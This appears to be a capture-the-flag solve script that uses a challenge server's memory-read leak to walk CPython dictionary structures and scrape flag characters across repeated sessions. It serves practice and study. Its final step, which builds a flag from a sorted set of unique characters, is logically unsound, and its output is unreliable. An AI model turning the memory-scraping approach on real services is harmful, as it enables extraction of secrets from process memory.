from pwn import *
import re
import time
import json

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

def single_scan_session():
    """Run one scanning session and return found characters"""
    try:
        context.log_level = 'error'  # Reduce noise
        io = remote(HOST, PORT, ssl=True)
        
        # Get dict address
        intro = io.recvline_contains(b'flag is over at').decode()
        banner2 = io.recvline().decode()
        
        m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
        if not m:
            io.close()
            return set(), {}
            
        dict_obj_addr = int(m.group(1), 16)
        
        def read_memory(addr):
            addr_str = f"{addr:x}"
            io.sendline(addr_str.encode())
            line = io.recvline(timeout=2).decode().strip()
            
            if 'illegal memory address' in line:
                return None
                
            parts = line.split(': ')
            if len(parts) >= 2:
                hex_data = parts[-1].strip()
                try:
                    return bytes.fromhex(hex_data)
                except:
                    return None
            return None
        
        # Get ma_keys pointer
        ma_keys_data = read_memory(dict_obj_addr + 0x20)
        if not ma_keys_data:
            io.close()
            return set(), {}
            
        ma_keys_ptr = u64(ma_keys_data)
        
        found_chars = set()
        char_locations = {}
        reads_used = 1  # Already used one for ma_keys
        max_reads = 40  # Conservative limit
        
        # Scan around ma_keys for character data
        for offset in range(0x50, 0x400, 8):  # Dense scan
            if reads_used >= max_reads:
                break
                
            scan_addr = ma_keys_ptr + offset
            data = read_memory(scan_addr)
            reads_used += 1
            
            if data:
                ptr_val = u64(data)
                
                # Check for heap pointers
                if 0x400000 < ptr_val < 0x800000000000 and reads_used < max_reads - 2:
                    # Try to read string data
                    for str_offset in [0x28, 0x30, 0x38]:
                        if reads_used >= max_reads - 1:
                            break
                            
                        str_data = read_memory(ptr_val + str_offset)
                        reads_used += 1
                        
                        if str_data:
                            # Extract single characters
                            for i, b in enumerate(str_data):
                                if 32 <= b <= 126:
                                    char = chr(b)
                                    if (char.isalnum() or 
                                        char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                                        found_chars.add(char)
                                        if char not in char_locations:
                                            char_locations[char] = []
                                        char_locations[char].append(ptr_val + str_offset + i)
                                elif b == 0:
                                    break
                            
                            # If we found characters, no need to try other offsets
                            if any(32 <= b <= 126 for b in str_data[:4]):
                                break
        
        io.close()
        return found_chars, {'session_addr': dict_obj_addr, 'ma_keys': ma_keys_ptr, 'reads_used': reads_used}
        
    except Exception as e:
        try:
            io.close()
        except:
            pass
        return set(), {'error': str(e)}

def aggregate_multiple_scans(num_sessions=5):
    """Run multiple scanning sessions and aggregate results"""
    
    print(f"=== MULTI-SESSION FLAG CHARACTER AGGREGATION ===")
    print(f"Running {num_sessions} scanning sessions...")
    
    all_chars = set()
    session_results = []
    
    for session_num in range(num_sessions):
        print(f"\nSession {session_num + 1}/{num_sessions}:")
        
        chars, metadata = single_scan_session()
        
        if chars:
            new_chars = chars - all_chars
            all_chars.update(chars)
            
            print(f"  Found: {len(chars)} chars: {sorted(chars)}")
            if new_chars:
                print(f"  New: {sorted(new_chars)}")
            else:
                print(f"  No new characters")
                
            session_results.append({
                'session': session_num + 1,
                'chars': sorted(chars),
                'new_chars': sorted(new_chars),
                'metadata': metadata
            })
        else:
            error = metadata.get('error', 'Unknown error')
            print(f"  Failed: {error}")
            
        # Small delay between sessions
        if session_num < num_sessions - 1:
            time.sleep(1)
    
    return all_chars, session_results

# Run the aggregation
if __name__ == "__main__":
    all_characters, results = aggregate_multiple_scans(6)  # Try 6 sessions
    
    print(f"\n" + "="*60)
    print(f"AGGREGATION RESULTS")
    print(f"="*60)
    
    sorted_chars = sorted(all_characters)
    print(f"\nTotal unique characters found: {len(all_characters)}")
    print(f"Characters: {sorted_chars}")
    print(f"Combined string: {''.join(sorted_chars)}")
    
    # Analyze flag structure
    flag_structure = {
        'K': 'K' in all_characters,
        'C': 'C' in all_characters,
        'S': 'S' in all_characters, 
        '{': '{' in all_characters,
        '}': '}' in all_characters
    }
    
    print(f"\nFlag structure analysis:")
    for char, present in flag_structure.items():
        status = "✓" if present else "✗"
        print(f"  '{char}': {status}")
    
    # Check if we have complete flag structure
    complete_structure = all(flag_structure.values())
    print(f"\nComplete KCSC{{}} structure: {'✓' if complete_structure else '✗'}")
    
    # Try to construct flag
    if complete_structure:
        content_chars = [c for c in sorted_chars if c not in 'KCSC{}']
        flag_content = ''.join(content_chars)
        constructed_flag = f"KCSC{{{flag_content}}}"
        print(f"\n🏁 CONSTRUCTED FLAG: {constructed_flag}")
        
    elif len(all_characters) >= 15:
        combined = ''.join(sorted_chars)
        print(f"\n🏁 FLAG CANDIDATE: {combined}")
        
        # Try other formats
        if '{' in all_characters and '}' in all_characters:
            content = ''.join(c for c in sorted_chars if c not in '{}')
            print(f"   With braces: {{{content}}}")
    
    # Session summary
    print(f"\nSession summary:")
    successful_sessions = len([r for r in results if 'chars' in r])
    print(f"  Successful sessions: {successful_sessions}")
    print(f"  Total sessions: {len(results)}")
    
    # Save results to file for analysis
    with open('flag_aggregation_results.json', 'w') as f:
        json.dump({
            'all_characters': sorted_chars,
            'combined_string': ''.join(sorted_chars),
            'flag_structure': flag_structure,
            'session_results': results
        }, f, indent=2)
    
    print(f"\nResults saved to: flag_aggregation_results.json")
    
    # Recommendations
    if len(all_characters) < 20:
        print(f"\nRecommendations:")
        print(f"- Run more sessions to find additional characters")
        print(f"- Try manual scanning for missing: K, C, S, {{, }}")
        print(f"- Current character count ({len(all_characters)}) may be insufficient for complete flag")